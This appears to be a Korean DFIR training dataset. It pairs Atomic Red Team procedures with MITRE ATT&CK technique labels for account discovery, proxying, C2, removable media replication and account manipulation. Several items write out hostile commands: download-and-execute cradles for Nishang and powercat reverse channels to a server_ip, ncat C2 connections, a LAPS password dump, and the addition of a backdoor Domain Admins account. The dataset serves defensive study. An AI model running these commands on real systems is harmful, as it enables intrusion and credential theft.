{"id": "T1087.002_T1087.002-22_Q22", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1087.002 Account Discovery: Domain Account (Tactic: Discovery)\n[요약] AdFind.exe를 사용해 도메인의 컴퓨터 객체에 대해 ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime 속성만 선택적으로 조회한다. 이는 LAPS 로컬 관리자 비밀번호를 노리는 직접적인 자격 증명 수집 기법을 재현한다.\n[절차] ExternalPayloads 디렉터리에 AdFind.exe가 존재하는지 확인한다. PowerShell에서 AdFind.exe #{optional_args} -h #{domain} -s subtree -f \"objectclass=computer\" ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime 명령을 실행한다. 출력 결과에서 각 컴퓨터의 LAPS 비밀번호와 만료 시간을 확인한다.\n[대표 명령 예시]\n& \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" #{optional_args} -h #{domain} -s subtree -f \"objectclass=computer\" ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime", "answer": "이 행위는 MITRE ATT&CK의 T1087.002 \"Account Discovery: Domain Account\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1090.001_T1090.001-1_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1090.001 Proxy: Internal Proxy (Tactic: Command and Control)\n[요약] netsh interface portproxy를 사용해 v4tov4 포트 프록시를 생성하는 시나리오를 시뮬레이션한다. 지정된 listenport로 들어오는 연결을 connectaddress:connectport로 투명하게 전달하여, 내부에서 프록시/포트포워더 역할을 수행하게 된다. 이 설정은 레지스트리 HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\PortProxy\\v4tov4에 저장되며, netsh interface portproxy show all 명령으로 확인할 수 있다.\n[절차] 관리자 권한 PowerShell 또는 cmd.exe 세션을 연다. 테스트에 사용할 대상 주소(connectaddress), 연결 포트(connectport), 수신 포트(listenport)를 결정한다(기본값: 127.0.0.1:1337 → 127.0.0.1:1337). netsh interface portproxy add v4tov4 listenport=#{listenport} connectport=#{connectport} connectaddress=#{connectaddress} 명령을 실행해 v4tov4 포트 프록시를 생성한다. netsh interface portproxy show all 명령으로 프록시 항목이 정상적으로 추가되었는지 확인한다. 동일 호스트 혹은 네트워크 상에서 listenport로 접속해, 실제 트래픽이 connectaddress:connectport로 전달되는지 검증할 수 있다.\n[대표 명령 예시]\nnetsh interface portproxy add v4tov4 listenport=#{listenport} connectport=#{connectport} connectaddress=#{connectaddress}", "answer": "이 행위는 MITRE ATT&CK의 T1090.001 \"Proxy: Internal Proxy\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Command and Control이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1090.003_T1090.003-1_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1090.003 Proxy: Multi-hop Proxy (Tactic: Command and Control)\n[요약] Psiphon 3 클라이언트를 실행해 VPN/SSH/HTTP 프록시 기반 우회 연결을 수립하는 멀티홉 프록시 시나리오를 시뮬레이션한다. 실행 전 현재 사용자의 인터넷 프록시 설정을 백업하고, Psiphon.bat을 통해 psiphon3.exe를 구동한 뒤 종료한다. 테스트가 끝나면 프록시 설정을 백업값으로 복원한다.\n[절차] 현재 사용자의 인터넷 프록시 설정(HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ProxyServer)을 읽어 $env:Temp\\proxy-backup.txt 파일로 백업한다. Psiphon 클라이언트(psiphon3.exe)가 PathToAtomicsFolder\\..\\ExternalPayloads 경로에 존재하는지 확인하고, 없을 경우 인터넷에서 다운로드해 저장한다. PathToAtomicsFolder\\T1090.003\\src\\Psiphon.bat 배치 파일이 존재하는지 확인하고, 없으면 Atomic Red Team GitHub에서 받아온 뒤 src 디렉터리에 저장한다. PowerShell에서 Psiphon.bat를 실행하여 Psiphon 3 클라이언트를 구동하고, VPN/SSH/HTTP 프록시 연결을 수립한다. Psiphon 실행 중에는 브라우저 등 클라이언트 트래픽이 Psiphon이 설정한 프록시/터널을 통해 우회 전송될 수 있다. 테스트 종료 시 proxy-backup.txt에 저장된 값을 다시 ProxyServer 레지스트리 키에 써넣어 원래 프록시 구성을 복원한다.\n[대표 명령 예시]\n& \"PathToAtomicsFolder\\T1090.003\\src\\Psiphon.bat\"", "answer": "이 행위는 MITRE ATT&CK의 T1090.003 \"Proxy: Multi-hop Proxy\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Command and Control이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1090.003_T1090.003-2_Q2", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1090.003 Proxy: Multi-hop Proxy (Tactic: Command and Control)\n[요약] tor.exe를 직접 실행해 Tor 프록시 서비스를 띄우는 멀티홉 프록시 시나리오를 시뮬레이션한다. 테스트는 외부에서 내려받은 tor.exe를 백그라운드에서 구동하고 약 60초 동안 실행한 후, tor 프로세스를 종료한다. 이 동안 로컬 SOCKS/HTTP 프록시를 통해 트래픽이 Tor 네트워크로 라우팅될 수 있다.\n[절차] Tor 실행 파일(tor.exe)의 경로를 입력 인자 TorExe(기본: PathToAtomicsFolder\\..\\ExternalPayloads\\tor\\Tor\\tor.exe)로 지정한다. 지정된 TorExe 경로에 파일이 존재하는지 확인하고, 없으면 get_prereq 단계에서 tor-win32-0.4.6.9.zip 아카이브를 다운로드한다. 다운로드한 tor.zip을 PathToAtomicsFolder\\..\\ExternalPayloads\\tor 디렉터리로 풀어 tor.exe를 생성한다. PowerShell에서 invoke-expression을 사용해 새로운 powershell 프로세스를 시작하고, 그 안에서 cmd /c \"tor.exe\" 명령을 실행해 tor 프록시 서비스를 구동한다. Tor 프로세스가 기동되면, 로컬 호스트의 SOCKS/프록시 포트를 통해 트래픽이 다중 홉을 거쳐 Tor 네트워크를 통해 라우팅될 수 있다. 스크립트는 60초간 대기(sleep -s 60)한 뒤 stop-process -name \"tor\"를 호출하여 tor.exe 프로세스를 종료한다.\n[대표 명령 예시]\ninvoke-expression 'cmd /c start powershell -Command {cmd /c \"#{TorExe}\"}'\nsleep -s 60\nstop-process -name \"tor\" | out-null", "answer": "이 행위는 MITRE ATT&CK의 T1090.003 \"Proxy: Multi-hop Proxy\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Command and Control이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1091_T1091-1_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1091 Replication Through Removable Media (Tactic: Lateral Movement)\n[요약] WMI를 사용해 시스템에 연결된 모든 이동식(USB) 드라이브를 열거한 뒤, 각 드라이브 루트에 테스트 파일을 생성하여 악성코드의 USB 복제 행위를 시뮬레이션한다. 실제 악성 페이로드 대신 T1091Test1.txt라는 파일을 생성해 ‘복제 흔적’만 남긴다. 클린업 단계에서는 동일한 파일을 다시 찾아 제거한다.\n[절차] PowerShell 세션을 연 뒤, Win32_LogicalDisk 클래스에서 drivetype=2(이동식 디스크)인 논리 드라이브들을 조회한다. Get-WmiObject -Class Win32_LogicalDisk -Filter \"drivetype=2\" 명령으로 이동식 드라이브 목록을 가져와 각 DeviceID(예: E:, F:)를 추출한다. ForEach 루프를 사용해 발견된 각 드라이브에 대해 \"Removable Drive Found:\" 메시지를 출력하며 드라이브 문자를 기록한다. New-Item -Path <Drive>\\T1091Test1.txt -ItemType file -Force 명령을 사용하여 각 이동식 드라이브 루트에 T1091Test1.txt 파일을 생성하고, 파일 내용에 시뮬레이션임을 나타내는 문자열을 기록한다. DFIR 관점에서는 여러 이동식 드라이브에 동일한 이름/내용의 텍스트 파일이 동시에 생성된 상태를 통해 USB 기반 복제 시나리오를 재현·분석할 수 있다.\n[대표 명령 예시]\n$RemovableDrives=@()\n$RemovableDrives = Get-WmiObject -Class Win32_LogicalDisk -filter \"drivetype=2\" | select-object -expandproperty DeviceID\nForEach ($Drive in $RemovableDrives)\n{\n  write-host \"Removable Drive Found:\" $Drive\n  New-Item -Path $Drive/T1091Test1.txt -ItemType \"file\" -Force -Value \"T1091 Test 1 has created this file to simulate malware spread to removable drives.\"\n}", "answer": "이 행위는 MITRE ATT&CK의 T1091 \"Replication Through Removable Media\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Lateral Movement이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1095_T1095-1_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1095 Non-Application Layer Protocol (Tactic: Command and Control)\n[요약] Nishang의 Invoke-PowerShellIcmp 스크립트를 다운로드해 메모리에서 로드한 뒤, ICMP 에코 패킷을 이용한 C2 채널을 수립하는 시나리오를 시뮬레이션한다. 지정한 server_ip로 향하는 ICMP 요청에 명령·응답 데이터가 포함되며, 네트워크 레벨에서 비정상적인 ICMP 트래픽 패턴을 관찰할 수 있다.\n[절차] 공격자 측 리스너(블로그 예제의 ICMP C2 서버)를 server_ip에 맞춰 미리 구동해둔다. 피해자 시스템에서 PowerShell을 실행하고, WebClient 객체를 이용해 Nishang GitHub 저장소의 Invoke-PowerShellIcmp.ps1를 다운로드한다. IEX (New-Object System.Net.WebClient).Downloadstring('<Nishang-URL>') 명령으로 스크립트를 디스크에 저장하지 않고 메모리에 직접 로드한다. Invoke-PowerShellIcmp -IPAddress #{server_ip} 명령을 호출해 지정된 서버 IP로 향하는 ICMP 기반 C2 세션을 수립한다. 공격자는 리스너 측에서 ICMP 패킷에 인코딩된 명령·응답을 주고받으며, 피해 호스트에서 명령 실행 및 결과 수신을 수행할 수 있다.\n[대표 명령 예시]\nIEX (New-Object System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1')\nInvoke-PowerShellIcmp -IPAddress #{server_ip}", "answer": "이 행위는 MITRE ATT&CK의 T1095 \"Non-Application Layer Protocol\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Command and Control이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1095_T1095-2_Q2", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1095 Non-Application Layer Protocol (Tactic: Command and Control)\n[요약] ncat.exe를 이용해 지정된 server_ip:server_port로 TCP 연결을 수립하고, Netcat 기반 C2 세션을 시뮬레이션한다. Windows 측에서는 클라이언트 역할을 수행하고, 원격 Linux/Unix 시스템에서 nc -l -p <port> 리스너를 통해 명령·응답 스트림을 주고받는다.\n[절차] 공격자(리스너) 측 Linux 등에서 nc -l -p <port> 명령을 사용해 server_port에 대한 리스너를 실행한다. 피해자 시스템에 ncat.exe가 있는지 ncat_exe 경로(기본: PathToAtomicsFolder\\..\\ExternalPayloads\\T1095\\nmap-7.80\\ncat.exe)를 기준으로 확인한다. 없을 경우 get_prereq 단계에서 nmap-7.80-win32.zip을 다운로드 후, Expand-Archive로 압축을 풀어 nmap-7.80\\ncat.exe를 준비한다. 필요시 vcredist_x86.exe를 실행해 VC++ 런타임을 설치한다. PowerShell에서 cmd /c \"#{ncat_exe} #{server_ip} #{server_port}\" 명령을 호출해 ncat 클라이언트를 실행한다. 연결이 수립되면 원격 리스너 측 콘솔에서 피해 호스트와의 표준 입력/출력 스트림을 통해 명령 실행·데이터 전송을 수행할 수 있다.\n[대표 명령 예시]\ncmd /c \"#{ncat_exe} #{server_ip} #{server_port}\"", "answer": "이 행위는 MITRE ATT&CK의 T1095 \"Non-Application Layer Protocol\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Command and Control이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1095_T1095-3_Q3", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1095 Non-Application Layer Protocol (Tactic: Command and Control)\n[요약] Powercat 스크립트를 원격 GitHub에서 다운로드해 메모리에 로드한 뒤, powercat -c 서버 -p 포트 명령으로 TCP 기반 C2 채널을 수립하는 시나리오를 시뮬레이션한다. Netcat과 유사한 기능을 PowerShell로 구현한 형태이며, 지정한 server_ip:server_port로의 비표준 포트 연결을 통해 명령·응답을 교환한다.\n[절차] 공격자 측 Linux 등에서 nc -l -p <port> 또는 호환 가능한 Netcat/Powercat 리스너를 server_port에 맞춰 구동한다. 피해자 시스템에서 PowerShell을 실행하고, WebClient를 사용해 powercat.ps1 스크립트를 GitHub에서 다운로드한다. IEX (New-Object System.Net.Webclient).Downloadstring('<powercat-URL>') 명령으로 powercat.ps1 내용을 디스크에 저장하지 않고 세션 메모리에 직접 로드한다. powercat -c #{server_ip} -p #{server_port} 명령을 실행해 server_ip:server_port로 TCP 클라이언트 연결을 생성한다. 연결이 수립되면 공격자 리스너 측에서 Powercat 세션을 통해 명령 실행, 파일 전송 등 다양한 C2 활동을 수행할 수 있다.\n[대표 명령 예시]\nIEX (New-Object System.Net.Webclient).Downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1')\npowercat -c #{server_ip} -p #{server_port}", "answer": "이 행위는 MITRE ATT&CK의 T1095 \"Non-Application Layer Protocol\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Command and Control이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1098_T1098-1_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1098 Account Manipulation (Tactic: Persistence)\n[요약] 로컬 Administrators 그룹에 속한 계정 중 이름에 'Administrator'가 포함된 로컬 사용자 계정을 찾아 HaHa_랜덤숫자 형식의 이름으로 변경하는 시나리오다. 원래 계정 이름과 설명은 Description 필드에 atr:원래이름;기존설명 형태로 숨겨 두었다가, cleanup 단계에서 이를 파싱해 다시 원래 상태로 복구한다. 실제 공격에서는 기본 관리자 계정의 존재를 숨기거나, 보안 담당자의 계정 식별·차단을 어렵게 하는 데 활용될 수 있다.\n[절차] 랜덤 숫자 4개(x, y, z, w)를 생성해 HaHa_xxyz 형식의 새 계정 이름 토큰을 만든다. Get-LocalGroupMember -Group Administrators 로 로컬 Administrators 그룹 구성원을 나열한다. ObjectClass=User, PrincipalSource=Local 이고 이름에 'Administrator'가 포함된 계정을 찾는다. 해당 계정의 Description 필드에 'atr:원래이름;기존설명'을 저장한 뒤 Rename-LocalUser로 계정명을 변경한다. cleanup 시 Description에 atr: 패턴이 있는 계정을 찾아 원래 이름과 설명으로 되돌린다.\n[대표 명령 예시]\n$x = Get-Random -Minimum 2 -Maximum 9999; $fmm = Get-LocalGroupMember -Group Administrators | ?{ $_.ObjectClass -match 'User' -and $_.PrincipalSource -match 'Local' }; foreach($member in $fmm) { if($member.Name -like '*Administrator*') { $account = $member.Name.Split('\\')[-1]; $origDesc = (Get-LocalUser -Name $account).Description; Set-LocalUser -Name $account -Description ('atr:' + $account + ';' + $origDesc).Substring(0,48); Rename-LocalUser -Name $account -NewName ('HaHa_' + $x); } }", "answer": "이 행위는 MITRE ATT&CK의 T1098 \"Account Manipulation\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Persistence이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1098_T1098-2_Q2", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1098 Account Manipulation (Tactic: Persistence)\n[요약] Active Directory 환경에서 atr-xxxx 형식의 무작위 계정을 생성한 뒤, 기본값으로 Domain Admins 같은 고권한 도메인 그룹에 추가하는 시나리오다. 공격자는 정상 서비스 계정처럼 보이는 이름을 사용해 백도어 계정을 만들어 두고, 고권한 그룹에 은밀히 넣어 장기적인 도메인 관리자 권한을 확보할 수 있다. cleanup 단계에서는 samAccountName이 atr- 접두어이고 GivenName이 Test인 계정을 LDAP 필터로 찾아 Remove-ADUser로 일괄 삭제한다.\n[절차] ActiveDirectory PowerShell 모듈을 Import-Module ActiveDirectory로 로드한다. 랜덤 숫자 4개를 묶어 atr-xxxx 형식의 새 도메인 계정 이름을 생성한다. New-ADUser로 Enabled:$False 상태의 테스트용 도메인 사용자 계정을 생성한다. Add-ADGroupMember 'Domain Admins' <계정>으로 지정한 도메인 그룹(Domain Admins 등)에 계정을 추가한다. cleanup 시 LDAPFilter로 atr- 접두어 + GivenName=Test 계정을 검색해 Remove-ADUser로 제거한다.\n[대표 명령 예시]\nImport-Module ActiveDirectory; $account = 'atr-' + (Get-Random -Minimum 10 -Maximum 99) + (Get-Random -Minimum 10 -Maximum 99); New-ADUser -Name $account -GivenName 'Test' -DisplayName $account -SamAccountName $account -Surname $account -Enabled:$False; Add-ADGroupMember 'Domain Admins' $account", "answer": "이 행위는 MITRE ATT&CK의 T1098 \"Account Manipulation\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Persistence이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1098_T1098-3_Q3", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1098 Account Manipulation (Tactic: Persistence)\n[요약] 이 테스트는 도메인 컨트롤러에서 ntdsutil을 사용해 Directory Service Restore Mode(DSRM) 계정의 비밀번호를 기존 도메인 계정의 비밀번호와 동기화한다. DSRM 계정은 AD 오프라인 복구 모드에서 로컬 로그온에 사용되는 강력한 계정이므로, 공격자가 이 비밀번호를 통제하면 AD DB 조작 및 추가 권한 상승이 가능해진다. 자동 복구가 없으므로 테스트 후 반드시 안전한 값으로 재설정해야 한다.\n[절차] 도메인 컨트롤러에서 관리자 권한 cmd.exe를 실행한다. ntdsutil을 호출해 'set dsrm password' 하위 메뉴로 진입한다. 'sync from domain account <계정>' 명령으로 지정 도메인 계정 비밀번호를 DSRM 계정에 동기화한다. q 명령을 두 번 입력해 ntdsutil을 종료한다. 필요 시 DSRM 계정 비밀번호를 별도의 강력한 값으로 다시 변경한다.\n[대표 명령 예시]\nntdsutil \"set dsrm password\" \"sync from domain account %username%\" \"q\" \"q\"", "answer": "이 행위는 MITRE ATT&CK의 T1098 \"Account Manipulation\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Persistence이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1098_T1098-4_Q4", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1098 Account Manipulation (Tactic: Persistence)\n[요약] 이 테스트는 현재 도메인 사용자 계정의 비밀번호를 길이 7자의 Uplow-1 값으로 변경해 보며, 최소 길이 및 복잡도 정책이 실제로 적용되는지 확인한다. 기존 비밀번호는 cred_file에 SecureString 형태로 저장해 두고, Set-ADAccountPassword 호출 시 OldPassword로 사용한다. 짧은 비밀번호로 변경이 성공하면 패스워드 정책이 허술하거나 적용이 잘못되어 브루트포스·사전 공격에 취약하다는 신호가 된다.\n[절차] 사전 준비 단계에서 Get-Credential을 사용해 현재 사용자 비밀번호를 cred_file에 암호화 저장한다. cred_file에서 SecureString 비밀번호를 읽어 PSCredential 객체를 생성한다. ConvertTo-SecureString 'Uplow-1' -AsPlainText -Force 로 새 비밀번호 SecureString을 만든다. Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.Password -NewPassword $newPassword 를 호출한다. 성공 시 cred_file 내용을 새 비밀번호로 갱신하고, 실패 시 예외 코드와 메시지를 로깅한다.\n[대표 명령 예시]\n$credFile = \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"; if (Test-Path $credFile) { $cred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)); $newPassword = ConvertTo-SecureString 'Uplow-1' -AsPlainText -Force; Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.Password -NewPassword $newPassword }", "answer": "이 행위는 MITRE ATT&CK의 T1098 \"Account Manipulation\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Persistence이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1098_T1098-5_Q5", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1098 Account Manipulation (Tactic: Persistence)\n[요약] 이 테스트는 숫자가 전혀 포함되지 않은 긴 비밀번호(UpperLowerLong-special)를 새 비밀번호로 설정해, 도메인 정책이 숫자 포함을 필수로 요구하는지 검증한다. 만약 이런 비밀번호로 변경이 성공하면 사용자가 문자·특수문자만 포함된 취약한 패턴을 쉽게 사용할 수 있고, 이는 사전 공격에 취약하다. 스크립트는 cred_file에 저장된 기존 비밀번호와 새 비밀번호가 동일한지 먼저 확인한 뒤, Set-ADAccountPassword를 호출한다.\n[절차] cred_file에서 현재 사용자 비밀번호를 읽어 PSCredential 객체를 생성한다. 새 비밀번호(UpperLowerLong-special)가 cred_file에 저장된 값과 동일한지 비교해 동일하면 종료한다. ConvertTo-SecureString 'UpperLowerLong-special' -AsPlainText -Force 로 새 비밀번호 SecureString을 만든다. Set-ADAccountPassword로 도메인 계정 비밀번호를 변경하고, 예외 발생 시 ErrorCode를 출력한다. 성공 시 cred_file을 새 비밀번호로 갱신한다.\n[대표 명령 예시]\n$credFile = \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"; if (Test-Path $credFile) { $cred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)); $newPassword = ConvertTo-SecureString 'UpperLowerLong-special' -AsPlainText -Force; Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.Password -NewPassword $newPassword }", "answer": "이 행위는 MITRE ATT&CK의 T1098 \"Account Manipulation\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Persistence이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1098_T1098-6_Q6", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1098 Account Manipulation (Tactic: Persistence)\n[요약] 이 테스트는 특수문자를 전혀 포함하지 않는 비밀번호(UpperLowerLong333noSpecialChar)를 설정해 비밀번호 정책이 특수문자 사용을 강제하는지 확인한다. 정책이 허술해 이런 비밀번호가 허용될 경우 사용자들은 Company2025 같은 단순 패턴을 널리 사용할 수 있고, 이는 무차별 대입에 매우 취약하다. 스크립트는 실패 시 예외 코드와 메시지를 출력해 정책 거부 사유를 파악할 수 있게 한다.\n[절차] cred_file에서 기존 비밀번호를 읽고 PSCredential 객체를 생성한다. 새 비밀번호(UpperLowerLong333noSpecialChar)가 기존 값과 동일한지 검사해 동일하면 테스트를 중단한다. ConvertTo-SecureString 'UpperLowerLong333noSpecialChar' -AsPlainText -Force 로 새 비밀번호를 준비한다. Set-ADAccountPassword로 비밀번호 변경을 시도하고, 실패 시 예외 및 ErrorCode를 출력한다. 성공 시 cred_file을 새 비밀번호로 갱신한다.\n[대표 명령 예시]\n$credFile = \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"; if (Test-Path $credFile) { $cred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)); $newPassword = ConvertTo-SecureString 'UpperLowerLong333noSpecialChar' -AsPlainText -Force; Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.Password -NewPassword $newPassword }", "answer": "이 행위는 MITRE ATT&CK의 T1098 \"Account Manipulation\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Persistence이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1098_T1098-7_Q7", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1098 Account Manipulation (Tactic: Persistence)\n[요약] 이 테스트는 모두 소문자와 숫자·특수문자로만 이루어진 비밀번호(lower-long-special-333)를 사용해 비밀번호 변경을 시도하며, 대문자 사용이 정책상 필수인지 확인한다. 대문자 요구사항이 없다면 공격자는 '소문자+숫자+특수문자' 패턴만을 대상으로 하는 사전으로도 많은 계정을 노릴 수 있다. 스크립트는 cred_file에 저장된 비밀번호와 새 비밀번호가 동일한지 확인하고, Set-ADAccountPassword를 호출한다.\n[절차] cred_file에서 현재 비밀번호를 읽어 PSCredential 객체를 만든다. 새 비밀번호(lower-long-special-333)가 cred_file 값과 동일한지 검사한다. ConvertTo-SecureString 'lower-long-special-333' -AsPlainText -Force 로 새 비밀번호를 만든다. Set-ADAccountPassword를 호출해 비밀번호를 변경하고, 오류 발생 시 ErrorCode를 출력한다. 성공 시 cred_file을 새 비밀번호로 갱신한다.\n[대표 명령 예시]\n$credFile = \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"; if (Test-Path $credFile) { $cred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)); $newPassword = ConvertTo-SecureString 'lower-long-special-333' -AsPlainText -Force; Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.Password -NewPassword $newPassword }", "answer": "이 행위는 MITRE ATT&CK의 T1098 \"Account Manipulation\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Persistence이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1098_T1098-8_Q8", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1098 Account Manipulation (Tactic: Persistence)\n[요약] 이 테스트는 모든 알파벳이 대문자이고 숫자·특수문자만 섞인 비밀번호(UPPER-LONG-SPECIAL-333)를 새 비밀번호로 설정해, 소문자 사용이 정책상 필수인지 확인한다. 소문자를 요구하지 않는 환경에서는 PASSWORD2025! 같은 단순 패턴의 대문자 비밀번호가 널리 사용될 수 있다. 스크립트는 cred_file에서 기존 비밀번호를 읽어와 Set-ADAccountPassword를 호출하고, 성공 시 cred_file을 새 비밀번호로 갱신한다.\n[절차] cred_file에서 현재 계정 비밀번호를 읽어 PSCredential 객체를 생성한다. 새 비밀번호(UPPER-LONG-SPECIAL-333)가 cred_file 값과 동일한지 검사한다. ConvertTo-SecureString 'UPPER-LONG-SPECIAL-333' -AsPlainText -Force 로 새 비밀번호 SecureString을 만든다. Set-ADAccountPassword로 비밀번호를 변경하고, 실패 시 예외와 ErrorCode를 출력한다. 성공 시 cred_file을 새 비밀번호로 덮어쓴다.\n[대표 명령 예시]\n$credFile = \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"; if (Test-Path $credFile) { $cred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)); $newPassword = ConvertTo-SecureString 'UPPER-LONG-SPECIAL-333' -AsPlainText -Force; Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.Password -NewPassword $newPassword }", "answer": "이 행위는 MITRE ATT&CK의 T1098 \"Account Manipulation\" 